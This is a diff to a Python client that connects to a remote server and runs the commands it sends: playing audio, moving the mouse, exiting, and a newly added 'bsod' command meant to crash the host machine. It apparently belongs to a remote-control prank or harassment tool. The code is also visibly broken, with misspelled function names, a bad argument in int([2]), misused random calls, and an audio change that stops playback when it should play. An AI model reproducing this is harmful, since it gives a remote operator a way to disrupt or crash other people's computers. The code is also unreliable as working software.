@@ -17,12 +17,12 @@ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.connect((addr, port))
 
 
-def playAudio(audiopath):
-    pygame.mixer.music.load(audiopath)
-    pygame.mixer.music.play()
-
-def stopAudio():
-    pygame.mixer.music.stop()
+def playAudio(audiopath = None, stopAudio = True):
+    if stopAudio == False:
+        pygame.mixer.music.load(audiopath)
+        pygame.mixer.music.play()
+    else:
+        pygame.mixer.music.stop()
 
 def returnmsg(msg):
     server.send(bytes(msg, "utf-8"))
@@ -62,13 +62,16 @@ def returnScreenRes():
 
 def parse(args):
     if args[0] == "audio":
-        playAudio(args[1]) 
-    if args[0] == "audioStop":
-        stopAudio()
+        if args[1] == "false":
+            playAudio(False)
+        else:
+            playAudio(args[1])
     if args[0] == "mm":
         MoveMouse(int(args[1]), int([2]))
     if args[0] == "mmr":
         moseMouse(int(random.random(returnScreenRes[0])), int(random.random(returnScreenRes[1])))
+    if args[0] == "bsod":
+        bsod(args[1], args[2])
     if args[0] == "exit":
         exit()
 
